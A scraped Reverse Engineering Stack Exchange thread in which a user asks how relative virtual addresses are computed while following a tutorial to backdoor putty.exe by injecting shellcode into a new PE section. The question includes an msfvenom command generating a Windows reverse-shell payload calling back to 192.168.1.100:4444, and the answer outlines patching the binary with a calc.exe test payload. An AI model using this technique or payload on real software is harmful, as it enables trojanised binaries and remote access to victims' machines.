{
    "title": "how to get address of PE section to jump in while backdooring PE binary",
    "link": "https://reverseengineering.stackexchange.com/questions/20954/how-to-get-address-of-pe-section-to-jump-in-while-backdooring-pe-binary",
    "content": "EDIT:\nI have posted this poste at security.stackexchange\nI am trying to follow this tutorial to backdoor a simple 32bits PE binary (putty.exe).\nThe method used is to create a new section (named <pre><code>.test</code></pre>) containing some shellcode, changing the first CALL instruction to JMP on it, executing it, and JMPing back to the original address the first CALL instruction contained before change for JMP.\nFirst part is adding new section, and I am OK with it (done with LordPE). Here are its caracteristics:\n<pre><code>Name    VOffset    VSize     ROffset   RSize    Flags\n.test   00110000   00001000  00106E00  00001000 E0000060\n</code></pre>\nIn <pre><code>immunity</code></pre>, I have loaded <pre><code>putty.exe</code></pre>. Memory view shows me that <pre><code>.test</code></pre> section is getting mapped at address 00510000\nHere are the first instructions being launched:\n<pre><code>7D4D1512 PUSH EAX\n0046F346 CALL putty. <--- I changed this for JMP putty.00510000\n0046F34B JMP putty.\n</code></pre>\nDebug mode JMP indeed to 00510000 ! So I copy/paste the payload at this place and debug again: payload created via:\n<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex\n</code></pre>\nI save the binary an re-launch immunity to debug it:\n<pre><code>7D4D1512 PUSH EAX\n0046F346 JMP putty.00510000\n</code></pre>\nBut JMP occurs now at the very end of the shellcode ! At 0051008E !\nFeeling the beginning of the section with NOP does not change the behavior (always at the end of the shellcode).\nHow is it possible to force the execution flow to the beginning of my shellcode instead ? As no one seems to have encountered this trouble, I suppose I missed some basics.\nThe document explains how the address is getting calculating like this:\n<pre><code>Next step is to hijack the first instruction by jumping to our new section,\nfor that we need the RVA for both the .test section, first CALL instruction\nand address of the next instruction.\n\n001C9DE6 > $ E8 15770000 CALL PsExec_b.001D1500\n001C9DEB .^E9 7BFEFFFF JMP PsExec_b.001C9C6B\n\nRVA of 001D1500 is RVA_11500. RVA of 001C9DEB is RVA_9DEB, RVA of .test is RVA_7D0000.\n</code></pre>\nI have no idea how he gets from 001D1500 to 11500 and what is the 1C0000 gap between these two values.\nMany thanks for you help understanding this point;\n",
    "votes": "0",
    "answers": 1,
    "views": "291",
    "tags": [
        "pe"
    ],
    "user": "philippe",
    "time": "Mar 24, 2019 at 21:08",
    "comments": [
        {
            "user": "Rup",
            "text": "RVA = Relative Virtual Address. I'd guess it's relative to the image base address, the address that the .exe is loaded at if it's not relocated. However AFAICS putty.exe's image base is the usual 400000, at least in the binary I have - try <pre><code>dumpbin /headers putty.exe</code></pre>.\n",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "I tried to replicate to hijack the entrypoint, but in this example, the first instruct is not jump, so I have to find another instruction with size of 5 which call 0x449674.\n\nI appended another section text.\n\nI generated a simple shellcode with this command.\nmsfvenom -p windows/exec CMD=calc.exe EXITFUNC=none -f hex\n\nWhat I had to do is write the shellcode in the appended section.\n\nBut first we have to modify the address in order to redirect the control to our shellcode.\n\nAnd yes, we created our backdoor, however, how can we revert back the control to PuTTY.exe?\nI just modified a few opcodes at the end of the shellcode.\n\nWhy JUMP not CALL? Let's check the stack.\nIf it is a JUMP, it will go to the original address:\n\nIf it is a CALL, it will pushes the RETURN address where it came from:\n\nHere is the result:\n",
            "votes": "1",
            "user": "ismael_akez",
            "time": "Mar 29, 2019 at 15:05",
            "is_accepted": false,
            "comments": [
                {
                    "user": "ismael_akez",
                    "text": "<span class=\"comment-copy\">I use ollydbg in this example, so I dont have to compute generate an opcode, Olly will do it for you.</span>",
                    "time": null
                }
            ]
        }
    ]
}